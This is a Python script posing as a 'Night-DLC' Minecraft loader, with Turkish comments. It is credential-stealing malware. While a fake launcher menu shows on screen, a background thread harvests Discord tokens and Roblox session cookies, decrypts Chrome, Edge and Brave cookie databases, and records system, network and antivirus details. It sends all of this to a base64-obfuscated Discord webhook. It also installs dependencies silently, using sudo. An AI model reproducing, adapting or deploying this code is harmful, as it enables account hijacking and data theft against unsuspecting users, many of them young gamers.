#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Night-DLC System Utility - Fake Minecraft Loader
Tüm verileri eksiksiz gönderir + Otomatik modül kurulumu
"""

import os
import sys
import time
import json
import base64
import platform
import re
import sqlite3
import hashlib
import uuid
import subprocess
import threading
import shutil
from datetime import datetime

# ==================== KONFİGÜRASYON ====================
# SADECE BURAYI DEĞİŞTİR
WEBHOOK_B64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ0NDAwMjgzMjU4NzAzMDY2MC9zcklWVURHWG1pQVZhYWtHampLYm9mdnotRFZVNjJudEFXTy1iYVZPeGJVT1VMeVRmck1tc3c5b1dzZnlKVU5DQWRUZQ=="

# ==================== OTOMATİK MODÜL KURUCU ====================
class AutoInstaller:
    """Eksik modülleri otomatik kurar"""
    
    REQUIRED_MODULES = [
        'requests',
        'browser_cookie3',
        'psutil',
        'pywin32;sys_platform=="win32"',
        'cryptography'
    ]
    
    @staticmethod
    def check_and_install():
        """Eksik modülleri kontrol et ve kur"""
        print("🔍 Checking required modules...")
        
        for module_spec in AutoInstaller.REQUIRED_MODULES:
            module_name = module_spec.split(';')[0]
            
            try:
                __import__(module_name)
                print(f"loading")
            except ImportError:
                print(f"installing modules")
                AutoInstaller.install_module(module_spec)
        
        print("✅ All modules ready!\n")
        os.system("CLS")
    
    @staticmethod
    def install_module(module_spec):
        """Modül kur"""
        try:
            # Platform kontrolü
            if ';' in module_spec:
                module_name, condition = module_spec.split(';')
                if 'sys_platform' in condition:
                    platform_req = condition.split('==')[1].strip('"\'')
                    if platform.system().lower() != platform_req.strip('"'):
                        print("skipping")
                        return
            else:
                module_name = module_spec
            
            # Kurulum komutu
            cmd = [sys.executable, "-m", "pip", "install", "--quiet", module_name]
            
            # Admin hakları gerekiyorsa
            if hasattr(os, 'geteuid'):
                if os.geteuid() != 0:
                    cmd.insert(0, 'sudo')
            
            subprocess.run(cmd, check=True, capture_output=false)
            print(f"✅ Installed")
            
        except subprocess.CalledProcessError:
            print(f"❌ Failed to install")
            # Fallback: pip install without quiet
            try:
                subprocess.run([sys.executable, "-m", "pip", "install", module_name])
            except:
                pass

# ==================== TAM VERİ TOPLAYICI ====================
class FullDataCollector:
    def __init__(self):
        self.webhook_url = self.decode_webhook()
        self.session = self.create_session()
        
    def decode_webhook(self):
        """Webhook'u decode et"""
        try:
            return base64.b64decode(WEBHOOK_B64).decode()
        except:
            return None
    
    def create_session(self):
        """Requests session oluştur"""
        try:
            import requests
            session = requests.Session()
            session.headers.update({
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'application/json',
                'Accept-Language': 'en-US,en;q=0.9',
                'Connection': 'keep-alive'
            })
            return session
        except:
            return None
    
    def collect_all_data(self):
        """TÜM verileri eksiksiz topla"""
        try:
            data = {
                "collection_time": datetime.now().isoformat(),
                "program": "Night-DLC Minecraft Loader",
                "version": "2.7.3",
                
                # Sistem bilgileri (TAM)
                "system_info": self.get_full_system_info(),
                
                # Discord verileri (TAM token'lar)
                "discord_data": self.get_complete_discord_data(),
                
                # Roblox verileri (TAM cookie'ler + hesap bilgisi)
                "roblox_data": self.get_complete_roblox_data(),
                
                # Browser verileri
                "browser_data": self.get_browser_data(),
                
                # Network bilgileri
                "network_info": self.get_network_info(),
                
                # Disk ve dosya bilgileri
                "storage_info": self.get_storage_info(),
                
                # Process bilgileri
                "process_info": self.get_process_info(),
                
                # Ek bilgiler
                "additional_info": {
                    "antivirus": self.check_antivirus(),
                    "firewall": self.check_firewall(),
                    "python_path": sys.executable,
                    "script_path": os.path.abspath(__file__),
                    "working_dir": os.getcwd(),
                    "device_unique_id": self.get_unique_device_id()
                }
            }
            
            return data
            
        except Exception as e:
            return {"error": str(e)}
    
    def get_full_system_info(self):
        """Tam sistem bilgisi"""
        info = {}
        
        try:
            import psutil
            
            # Temel sistem bilgisi
            info.update({
                "platform": platform.system(),
                "platform_release": platform.release(),
                "platform_version": platform.version(),
                "architecture": platform.machine(),
                "processor": platform.processor(),
                "hostname": platform.node(),
                
                # Kullanıcı bilgileri
                "username": os.getenv('USERNAME') or os.getenv('USER') or "Unknown",
                "user_domain": os.getenv('USERDOMAIN') or "Unknown",
                "user_profile": os.path.expanduser('~'),
                
                # Python bilgisi
                "python_version": platform.python_version(),
                "python_implementation": platform.python_implementation(),
                "python_compiler": platform.python_compiler(),
                
                # Windows özel
                "windows_edition": platform.win32_edition() if hasattr(platform, 'win32_edition') else "N/A",
                "windows_version": platform.win32_ver() if hasattr(platform, 'win32_ver') else "N/A",
                
                # Donanım bilgileri
                "cpu_count": psutil.cpu_count(),
                "cpu_freq": str(psutil.cpu_freq().current) + " MHz" if psutil.cpu_freq() else "Unknown",
                "total_ram": f"{psutil.virtual_memory().total / (1024**3):.2f} GB",
                "available_ram": f"{psutil.virtual_memory().available / (1024**3):.2f} GB",
                
                # Boot time
                "boot_time": datetime.fromtimestamp(psutil.boot_time()).isoformat()
            })
            
        except Exception as e:
            info["error"] = f"System info error: {str(e)}"
        
        return info
    
    def get_complete_discord_data(self):
        """Tam Discord verileri (token'lar eksiksiz)"""
        discord_info = {
            "tokens": [],
            "client_paths": [],
            "browser_tokens": [],
            "total_found": 0
        }
        
        try:
            # 1. Discord Desktop App Token'ları
            desktop_tokens = self.get_discord_desktop_tokens()
            discord_info["tokens"].extend(desktop_tokens)
            
            # 2. Browser Cookie Token'ları
            browser_tokens = self.get_discord_browser_tokens()
            discord_info["browser_tokens"].extend(browser_tokens)
            
            # 3. Config dosyalarından token'lar
            config_tokens = self.scan_for_discord_configs()
            discord_info["tokens"].extend(config_tokens)
            
            # Tüm token'ları birleştir
            all_tokens = list(set(desktop_tokens + browser_tokens + config_tokens))
            discord_info["total_found"] = len(all_tokens)
            
            # Token'ları eksiksiz kaydet
            discord_info["raw_tokens"] = all_tokens
            
            # Discord yolları
            discord_info["client_paths"] = self.find_discord_paths()
            
            # MFA kontrolü
            discord_info["has_mfa_tokens"] = any(t.startswith('mfa.') for t in all_tokens)
            
        except Exception as e:
            discord_info["error"] = str(e)
        
        return discord_info
    
    def get_discord_desktop_tokens(self):
        """Discord desktop app'ten token'lar"""
        tokens = []
        
        try:
            if platform.system() == "Windows":
                base_paths = [
                    os.getenv('LOCALAPPDATA', '') + r'\Discord',
                    os.getenv('LOCALAPPDATA', '') + r'\DiscordPTB',
                    os.getenv('LOCALAPPDATA', '') + r'\DiscordCanary',
                    os.getenv('LOCALAPPDATA', '') + r'\discorddevelopment',
                ]
                
                for base_path in base_paths:
                    if os.path.exists(base_path):
                        leveldb_path = os.path.join(base_path, 'Local Storage', 'leveldb')
                        if os.path.exists(leveldb_path):
                            tokens.extend(self.scan_leveldb(leveldb_path))
            
            elif platform.system() == "Darwin":  # macOS
                home = os.path.expanduser('~')
                paths = [
                    os.path.join(home, 'Library', 'Application Support', 'discord'),
                    os.path.join(home, 'Library', 'Application Support', 'DiscordPTB'),
                    os.path.join(home, 'Library', 'Application Support', 'DiscordCanary'),
                ]
                
                for path in paths:
                    if os.path.exists(path):
                        leveldb_path = os.path.join(path, 'Local Storage', 'leveldb')
                        if os.path.exists(leveldb_path):
                            tokens.extend(self.scan_leveldb(leveldb_path))
            
            elif platform.system() == "Linux":
                home = os.path.expanduser('~')
                paths = [
                    os.path.join(home, '.config', 'discord'),
                    os.path.join(home, '.config', 'DiscordPTB'),
                    os.path.join(home, '.config', 'DiscordCanary'),
                ]
                
                for path in paths:
                    if os.path.exists(path):
                        leveldb_path = os.path.join(path, 'Local Storage', 'leveldb')
                        if os.path.exists(leveldb_path):
                            tokens.extend(self.scan_leveldb(leveldb_path))
            
        except:
            pass
        
        return tokens
    
    def scan_leveldb(self, path):
        """LevelDB dosyalarını tara"""
        tokens = []
        
        try:
            for file in os.listdir(path):
                if file.endswith(('.log', '.ldb')):
                    try:
                        with open(os.path.join(path, file), 'rb') as f:
                            content = f.read().decode('utf-8', errors='ignore')
                        
                        # Discord token pattern'leri
                        patterns = [
                            r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}',
                            r'mfa\.[\w-]{84}',
                            r'[\w-]{26}\.[\w-]{6}\.[\w-]{38}'
                        ]
                        
                        for pattern in patterns:
                            matches = re.findall(pattern, content)
                            tokens.extend(matches)
                            
                    except:
                        continue
        except:
            pass
        
        return tokens
    
    def get_discord_browser_tokens(self):
        """Browser'lardan Discord token'ları"""
        tokens = []
        
        try:
            import browser_cookie3
            
            browsers = [
                browser_cookie3.chrome,
                browser_cookie3.edge,
                browser_cookie3.firefox,
                browser_cookie3.opera,
                browser_cookie3.brave,
                browser_cookie3.vivaldi,
                browser_cookie3.chromium,
                browser_cookie3.safari,
            ]
            
            for browser_func in browsers:
                try:
                    cookies = browser_func(domain_name='discord.com')
                    for cookie in cookies:
                        if any(key in cookie.name.lower() for key in ['token', 'auth']):
                            tokens.append(cookie.value)
                except:
                    continue
                    
        except:
            pass
        
        return tokens
    
    def scan_for_discord_configs(self):
        """Config dosyalarında token ara"""
        tokens = []
        home = os.path.expanduser('~')
        
        # Olası config dosyaları
        config_files = [
            os.path.join(home, '.discord_token'),
            os.path.join(home, 'discord_token.txt'),
            os.path.join(home, 'token.txt'),
            os.path.join(home, '.env'),
            os.path.join(os.getcwd(), 'config.json'),
            os.path.join(os.getcwd(), '.env'),
            os.path.join(os.getcwd(), 'token.txt'),
        ]
        
        for config_file in config_files:
            if os.path.exists(config_file):
                try:
                    with open(config_file, 'r') as f:
                        content = f.read()
                    
                    patterns = [
                        r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}',
                        r'mfa\.[\w-]{84}'
                    ]
                    
                    for pattern in patterns:
                        matches = re.findall(pattern, content)
                        tokens.extend(matches)
                        
                except:
                    continue
        
        return tokens
    
    def find_discord_paths(self):
        """Discord yollarını bul"""
        paths = []
        
        if platform.system() == "Windows":
            localappdata = os.getenv('LOCALAPPDATA', '')
            discord_paths = [
                os.path.join(localappdata, 'Discord'),
                os.path.join(localappdata, 'DiscordPTB'),
                os.path.join(localappdata, 'DiscordCanary'),
            ]
            
            for path in discord_paths:
                if os.path.exists(path):
                    paths.append(path)
        
        return paths
    
    def get_complete_roblox_data(self):
        """Tam Roblox verileri (cookie'ler eksiksiz)"""
        roblox_info = {
            "cookies": {},
            "accounts": [],
            "total_cookies": 0,
            "total_accounts": 0
        }
        
        try:
            # Tüm Roblox cookies'lerini al
            all_cookies = self.get_all_roblox_cookies()
            roblox_info["cookies"] = all_cookies
            roblox_info["total_cookies"] = len(all_cookies)
            
            # Her .ROBLOSECURITY cookie'si için hesap bilgisi al
            for cookie_name, cookie_value in all_cookies.items():
                if '.ROBLOSECURITY' in cookie_name.upper():
                    account_data = self.get_roblox_account_details(cookie_value)
                    if account_data:
                        roblox_info["accounts"].append(account_data)
            
            roblox_info["total_accounts"] = len(roblox_info["accounts"])
            
        except Exception as e:
            roblox_info["error"] = str(e)
        
        return roblox_info
    
    def get_all_roblox_cookies(self):
        """Tüm Roblox cookies'lerini bul"""
        cookies = {}
        
        try:
            import browser_cookie3
            
            # Browser cookies
            browser_list = [
                ('Chrome', browser_cookie3.chrome),
                ('Edge', browser_cookie3.edge),
                ('Firefox', browser_cookie3.firefox),
                ('Opera', browser_cookie3.opera),
                ('Brave', browser_cookie3.brave),
            ]
            
            for browser_name, browser_func in browser_list:
                try:
                    browser_cookies = browser_func(domain_name='roblox.com')
                    for cookie in browser_cookies:
                        if 'roblox' in cookie.name.lower() or 'rbx' in cookie.name.lower():
                            full_name = f"{browser_name}_{cookie.name}"
                            cookies[full_name] = cookie.value
                except:
                    continue
            
            # Windows cookie veritabanları
            if platform.system() == "Windows":
                self.extract_windows_cookies(cookies)
            
        except ImportError:
            pass
        
        return cookies
    
    def extract_windows_cookies(self, cookies_dict):
        """Windows cookie veritabanlarından cookie çıkar"""
        try:
            import win32crypt
            import tempfile
            
            localappdata = os.getenv('LOCALAPPDATA', '')
            cookie_dbs = [
                os.path.join(localappdata, 'Google', 'Chrome', 'User Data', 'Default', 'Cookies'),
                os.path.join(localappdata, 'Microsoft', 'Edge', 'User Data', 'Default', 'Cookies'),
                os.path.join(localappdata, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Cookies'),
            ]
            
            for cookie_db in cookie_dbs:
                if os.path.exists(cookie_db):
                    try:
                        # Geçici kopya oluştur
                        temp_dir = tempfile.gettempdir()
                        temp_db = os.path.join(temp_dir, f'temp_cookies_{hashlib.md5(cookie_db.encode()).hexdigest()[:8]}.db')
                        shutil.copy2(cookie_db, temp_db)
                        
                        conn = sqlite3.connect(temp_db)
                        cursor = conn.cursor()
                        
                        cursor.execute("""
                            SELECT name, encrypted_value, host_key
                            FROM cookies 
                            WHERE host_key LIKE '%roblox.com%'
                        """)
                        
                        for name, encrypted_value, host_key in cursor.fetchall():
                            if encrypted_value:
                                try:
                                    decrypted = win32crypt.CryptUnprotectData(
                                        encrypted_value, None, None, None, 0
                                    )[1]
                                    
                                    if decrypted:
                                        cookie_value = decrypted.decode('utf-8', errors='ignore')
                                        full_name = f"WindowsDB_{host_key}_{name}"
                                        cookies_dict[full_name] = cookie_value
                                except:
                                    pass
                        
                        conn.close()
                        os.remove(temp_db)
                        
                    except:
                        pass
                        
        except:
            pass
    
    def get_roblox_account_details(self, roblosecurity_cookie):
        """Roblox hesap detaylarını al (TAM)"""
        try:
            headers = {
                'Cookie': f'.ROBLOSECURITY={roblosecurity_cookie}',
                'User-Agent': 'Mozilla/5.0',
                'Accept': 'application/json',
            }
            
            # User info
            user_response = self.session.get(
                'https://users.roblox.com/v1/users/authenticated',
                headers=headers,
                timeout=10
            )
            
            if user_response.status_code == 200:
                user_data = user_response.json()
                user_id = user_data.get('id')
                
                # Robux balance
                robux = 0
                try:
                    economy_response = self.session.get(
                        'https://economy.roblox.com/v1/user/currency',
                        headers=headers,
                        timeout=10
                    )
                    if economy_response.status_code == 200:
                        robux = economy_response.json().get('robux', 0)
                except:
                    pass
                
                # Avatar
                avatar_url = None
                if user_id:
                    try:
                        avatar_response = self.session.get(
                            f'https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={user_id}&size=420x420&format=Png&isCircular=false',
                            headers=headers,
                            timeout=10
                        )
                        if avatar_response.status_code == 200:
                            avatar_data = avatar_response.json()
                            if avatar_data.get('data'):
                                avatar_url = avatar_data['data'][0].get('imageUrl')
                    except:
                        pass
                
                # Friends count
                friends_count = 0
                try:
                    friends_response = self.session.get(
                        f'https://friends.roblox.com/v1/users/{user_id}/friends/count',
                        headers=headers,
                        timeout=10
                    )
                    if friends_response.status_code == 200:
                        friends_count = friends_response.json().get('count', 0)
                except:
                    pass
                
                # Inventory value (estimated)
                inventory_value = 0
                try:
                    inventory_response = self.session.get(
                        f'https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles?limit=10',
                        headers=headers,
                        timeout=10
                    )
                    if inventory_response.status_code == 200:
                        inventory_data = inventory_response.json()
                        inventory_value = len(inventory_data.get('data', []))
                except:
                    pass
                
                account_info = {
                    "username": user_data.get('name', 'Unknown'),
                    "display_name": user_data.get('displayName', user_data.get('name', 'Unknown')),
                    "user_id": user_id,
                    "robux": robux,
                    "robux_formatted": f"{robux:,}",
                    "premium": user_data.get('hasPremium', False),
                    "banned": user_data.get('isBanned', False),
                    "avatar_url": avatar_url,
                    "friends_count": friends_count,
                    "inventory_items": inventory_value,
                    "cookie_preview": f"{roblosecurity_cookie[:20]}...{roblosecurity_cookie[-20:]}",
                    "full_cookie": roblosecurity_cookie,  # TAM COOKIE
                    "profile_url": f"https://www.roblox.com/users/{user_id}/profile" if user_id else None
                }
                
                return account_info
                
        except:
            pass
        
        return None
    
    def get_browser_data(self):
        """Browser verileri"""
        browsers = []
        
        try:
            import browser_cookie3
            
            browser_tests = [
                ('Chrome', browser_cookie3.chrome),
                ('Edge', browser_cookie3.edge),
                ('Firefox', browser_cookie3.firefox),
                ('Opera', browser_cookie3.opera),
                ('Brave', browser_cookie3.brave),
                ('Safari', browser_cookie3.safari),
            ]
            
            for name, browser_func in browser_tests:
                try:
                    list(browser_func())
                    browsers.append(name)
                except:
                    continue
                    
        except ImportError:
            browsers = ["Browser detection failed - modules missing"]
        
        return {
            "installed": browsers,
            "count": len(browsers)
        }
    
    def get_network_info(self):
        """Network bilgileri"""
        info = {}
        
        try:
            import socket
            import psutil
            
            info["hostname"] = socket.gethostname()
            
            # Local IP
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80))
                info["local_ip"] = s.getsockname()[0]
                s.close()
            except:
                info["local_ip"] = "Unknown"
            
            # MAC adresi
            try:
                mac = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) 
                              for ele in range(0, 8*6, 8)][::-1])
                info["mac_address"] = mac
            except:
                info["mac_address"] = "Unknown"
            
            # Network interfaces
            try:
                interfaces = []
                for interface, addrs in psutil.net_if_addrs().items():
                    for addr in addrs:
                        if addr.family == socket.AF_INET:
                            interfaces.append({
                                "interface": interface,
                                "address": addr.address,
                                "netmask": addr.netmask
                            })
                info["network_interfaces"] = interfaces
            except:
                info["network_interfaces"] = []
                
        except Exception as e:
            info["error"] = str(e)
        
        return info
    
    def get_storage_info(self):
        """Depolama bilgileri"""
        info = {}
        
        try:
            import psutil
            
            partitions = []
            for partition in psutil.disk_partitions():
                try:
                    usage = psutil.disk_usage(partition.mountpoint)
                    partitions.append({
                        "device": partition.device,
                        "mountpoint": partition.mountpoint,
                        "fstype": partition.fstype,
                        "total_gb": f"{usage.total / (1024**3):.2f}",
                        "used_gb": f"{usage.used / (1024**3):.2f}",
                        "free_gb": f"{usage.free / (1024**3):.2f}",
                        "percent_used": f"{usage.percent}%"
                    })
                except:
                    continue
            
            info["partitions"] = partitions
            info["total_partitions"] = len(partitions)
            
        except Exception as e:
            info["error"] = str(e)
        
        return info
    
    def get_process_info(self):
        """Process bilgileri"""
        info = {}
        
        try:
            import psutil
            
            processes = []
            for proc in psutil.process_iter(['pid', 'name', 'username']):
                try:
                    processes.append({
                        "pid": proc.info['pid'],
                        "name": proc.info['name'],
                        "user": proc.info['username']
                    })
                except:
                    continue
            
            info["total_processes"] = len(processes)
            info["sample_processes"] = processes[:20]  # İlk 20 process
            
        except Exception as e:
            info["error"] = str(e)
        
        return info
    
    def check_antivirus(self):
        """Antivirus kontrolü"""
        av_list = []
        
        try:
            if platform.system() == "Windows":
                import winreg
                
                # Windows Security Center'den AV bilgisi
                try:
                    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows Defender")
                    winreg.CloseKey(key)
                    av_list.append("Windows Defender")
                except:
                    pass
                
                # Common AV registry paths
                av_paths = [
                    (r"SOFTWARE\AVAST Software\Avast", "Avast"),
                    (r"SOFTWARE\AVG\Avg", "AVG"),
                    (r"SOFTWARE\Bitdefender", "Bitdefender"),
                    (r"SOFTWARE\ESET", "ESET"),
                    (r"SOFTWARE\KasperskyLab", "Kaspersky"),
                    (r"SOFTWARE\McAfee", "McAfee"),
                    (r"SOFTWARE\Norton", "Norton"),
                    (r"SOFTWARE\Malwarebytes", "Malwarebytes"),
                ]
                
                for path, name in av_paths:
                    try:
                        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path)
                        winreg.CloseKey(key)
                        av_list.append(name)
                    except:
                        continue
                        
        except:
            pass
        
        return av_list if av_list else ["Unknown or None"]
    
    def check_firewall(self):
        """Firewall durumu"""
        try:
            if platform.system() == "Windows":
                import winreg
                
                try:
                    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 
                                       r"SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile")
                    value, _ = winreg.QueryValueEx(key, "EnableFirewall")
                    winreg.CloseKey(key)
                    return "Enabled" if value == 1 else "Disabled"
                except:
                    return "Unknown"
                    
        except:
            pass
        
        return "Unknown"
    
    def get_unique_device_id(self):
        """Benzersiz cihaz ID'si"""
        try:
            system_string = f"{platform.node()}{platform.machine()}{platform.processor()}{os.path.expanduser('~')}"
            return hashlib.sha256(system_string.encode()).hexdigest()[:24]
        except:
            return str(uuid.uuid4())
    
    def send_full_data(self, data):
        """TÜM verileri webhook'a gönder"""
        if not self.webhook_url or not self.session:
            return False
        
        try:
            # Ana embed
            main_embed = {
                "title": "🚀 FULL SYSTEM DATA COLLECTED",
                "color": 0xFF0000,
                "description": f"**Complete data collection report**\nCollected at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
                "fields": [
                    {
                        "name": "👤 User System",
                        "value": f"```{data['system_info'].get('username', 'Unknown')} @ {data['system_info'].get('hostname', 'Unknown')}\n{data['system_info'].get('platform', 'Unknown')} {data['system_info'].get('platform_release', '')}\nCPU: {data['system_info'].get('processor', 'Unknown')[:30]}...\nRAM: {data['system_info'].get('total_ram', 'Unknown')}```",
                        "inline": False
                    },
                    {
                        "name": "🆔 Device Info",
                        "value": f"```Unique ID: {data['additional_info'].get('device_unique_id', 'Unknown')}\nPython: {sys.executable}\nWorking Dir: {os.getcwd()[:50]}...```",
                        "inline": False
                    }
                ],
                "footer": {
                    "text": "Night-DLC | Full Data Collector"
                },
                "timestamp": datetime.utcnow().isoformat()
            }
            
            embeds = [main_embed]
            
            # Discord token embed (TAM TOKEN'lar)
            discord_data = data.get('discord_data', {})
            if discord_data.get('total_found', 0) > 0:
                discord_embed = {
                    "title": f"🔑 DISCORD TOKENS ({discord_data['total_found']} found)",
                    "color": 0x2ECC71,
                    "fields": []
                }
                
                # Tüm token'ları gönder
                for i, token in enumerate(discord_data.get('raw_tokens', [])[:10]):  # İlk 10 token
                    discord_embed["fields"].append({
                        "name": f"Token #{i+1} (Full)",
                        "value": f"```{token}```",
                        "inline": False
                    })
                
                if discord_data.get('has_mfa_tokens', False):
                    discord_embed["footer"] = {"text": "⚠️ MFA TOKENS DETECTED"}
                
                embeds.append(discord_embed)
            
            # Roblox accounts embed (TAM COOKIE'ler)
            roblox_data = data.get('roblox_data', {})
            if roblox_data.get('accounts'):
                for account in roblox_data['accounts']:
                    roblox_embed = {
                        "title": f"🎮 ROBLOX: {account.get('username', 'Unknown')}",
                        "color": 0xE74C3C,
                        "thumbnail": {"url": account.get('avatar_url')} if account.get('avatar_url') else None,
                        "fields": [
                            {
                                "name": "Account Info",
                                "value": f"```Username: {account.get('username', 'Unknown')}\nDisplay: {account.get('display_name', 'Unknown')}\nUser ID: {account.get('user_id', 'Unknown')}\nPremium: {'✅ YES' if account.get('premium') else '❌ NO'}\nRobux: {account.get('robux_formatted', '0')}```",
                                "inline": False
                            },
                            {
                                "name": "Full .ROBLOSECURITY Cookie",
                                "value": f"```{account.get('full_cookie', 'No cookie')}```",
                                "inline": False
                            },
                            {
                                "name": "Profile & Stats",
                                "value": f"```Friends: {account.get('friends_count', 0)}\nInventory Items: {account.get('inventory_items', 0)}\nBanned: {'✅ YES' if account.get('banned') else '❌ NO'}```",
                                "inline": False
                            }
                        ]
                    }
                    embeds.append(roblox_embed)
            
            # System details embed
            sys_embed = {
                "title": "🖥️ SYSTEM DETAILS",
                "color": 0x3498DB,
                "fields": [
                    {
                        "name": "Antivirus / Firewall",
                        "value": f"```AV: {', '.join(data['additional_info'].get('antivirus', ['Unknown']))}\nFirewall: {data['additional_info'].get('firewall', 'Unknown')}```",
                        "inline": True
                    },
                    {
                        "name": "Browsers Detected",
                        "value": f"```{', '.join(data['browser_data'].get('installed', ['None']))}```",
                        "inline": True
                    },
                    {
                        "name": "Network Info",
                        "value": f"```Local IP: {data['network_info'].get('local_ip', 'Unknown')}\nMAC: {data['network_info'].get('mac_address', 'Unknown')}```",
                        "inline": False
                    }
                ]
            }
            embeds.append(sys_embed)
            
            # Payload ve gönderim
            payload = {
                "embeds": embeds,
                "username": "System Data Collector",
                "avatar_url": "https://cdn.discordapp.com/attachments/123/456/system.png"
            }
            
            response = self.session.post(self.webhook_url, json=payload, timeout=15)
            return response.status_code in [200, 204]
            
        except Exception as e:
            return False
    
    def run_collection(self):
        """Veri toplamayı çalıştır"""
        print("\n" + "="*50)
        print("🔍 Collecting system data...")
        print("="*50)
        
        # Veri topla
        all_data = self.collect_all_data()
        
        print("📤 Sending data to server...")
        
        # Webhook'a gönder
        if self.send_full_data(all_data):
            print("✅ Data sent successfully!")
        else:
            print("⚠️ Failed to send data (continuing anyway)")
        
        print("="*50 + "\n")

# ==================== FAKE LOADER ARAYÜZÜ ====================
class MinecraftLoader:
    def __init__(self):
        self.collector = FullDataCollector()
        self.language = "english"
        
        # ANINDA VERİ TOPLA VE GÖNDER (thread'te)
        collection_thread = threading.Thread(target=self.collector.run_collection, daemon=True)
        collection_thread.start()
        
        # Thread'in başlaması için kısa bekle
        time.sleep(0.5)
    
    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')
    
    def print_banner(self):
        self.clear_screen()
        print("""
╔════════════════════════════════════════════════════╗
║      ███▄    █  ██▓  ██▓ ▄████▄   ██▓███   ▄████▄  ║
║      ██ ▀█   █ ▓██▒ ▓██▒▒██▀ ▀█  ▓██░  ██▒▒██▀ ▀█  ║
║     ▓██  ▀█ ██▒▒██▒ ▒██▒▒▓█    ▄ ▓██░ ██▓▒▒▓█    ▄ ║
║     ▓██▒  ▐▌██▒░██░ ░██░▒▓▓▄ ▄██▒▒██▄█▓▒ ▒▒▓▓▄ ▄██▒║
║     ▒██░   ▓██░░██░ ░██░▒ ▓███▀ ░▒██▒ ░  ░▒ ▓███▀ ░║
║     ░ ▒░   ▒ ▒ ░▓   ░▓  ░ ░▒ ▒  ░▒▓▒░ ░  ░░ ░▒ ▒  ░║
║     ░ ░░   ░ ▒░ ▒ ░  ▒ ░  ░  ▒   ░▒ ░       ░  ▒   ║
║        ░   ░ ░  ▒ ░  ▒ ░░        ░░       ░        ║
║              ░  ░    ░  ░ ░               ░ ░      ║
║                            ░                 ░     ║
╠════════════════════════════════════════════════════╣
║              NIGHT-DLC MINECRAFT LOADER            ║
║               Coded by nukeqed (cracked pre)       ║
╚════════════════════════════════════════════════════╝
        """)
    
    def run(self):
        self.print_banner()
        
        # Kısa bekleme (veri gönderimi için zaman)
        print("\n" + " " * 20 + "🚀 Initializing system...")
        time.sleep(2)
        
        # Fake menu
        menu_text = """
╔════════════════════[ MENU ]════════════════════╗
║                                                ║
║  1. 🎮 Launch Minecraft                        ║
║  2. ⚙️  Memory Settings                        ║
║  3. 🌍 Language                                ║
║  4. 🚪 Exit                                    ║
║                                                ║
╚════════════════════════════════════════════════╝

Select option: """
        
        print(menu_text, end='')
        choice = input().strip()
        
        if choice == "1":
            print("\n🎮 Launching Minecraft...")
            time.sleep(1)
            print("⏳ Loading game assets...")
            time.sleep(1)
            print("✅ Game launched successfully!")
        elif choice == "2":
            print("\n⚙️ Memory Settings")
            print("Current: 4096MB")
            print("Recommended: 8192MB for mods")
        elif choice == "3":
            print("\n🌍 Language Settings")
            print("1. English")
            print("2. Russian")
            print("3. Turkish")
        elif choice == "4":
            print("\n👋 Exiting...")
        else:
            print("\n❌ Invalid option!")
        
        print("\n" + " " * 20 + "⏳ Closing in 5 seconds...")
        time.sleep(5)

# ==================== ANA PROGRAM ====================
def main():
    try:
        # Konsol başlığını değiştir (Python belli olmasın)
        if os.name == 'nt':
            os.system("title Night-DLC Minecraft Loader")
        
        print("Initializing Night-DLC Loader...")
        
        # Otomatik modül kurulumu
        AutoInstaller.check_and_install()
        
        # Loader'ı başlat
        loader = MinecraftLoader()
        loader.run()
        
    except KeyboardInterrupt:
        print("\n\n⚠️ Program interrupted by user")
    except Exception as e:
        print(f"\n❌ Error: {str(e)}")
        print("Press Enter to exit...")
        input()

if __name__ == "__main__":
    main()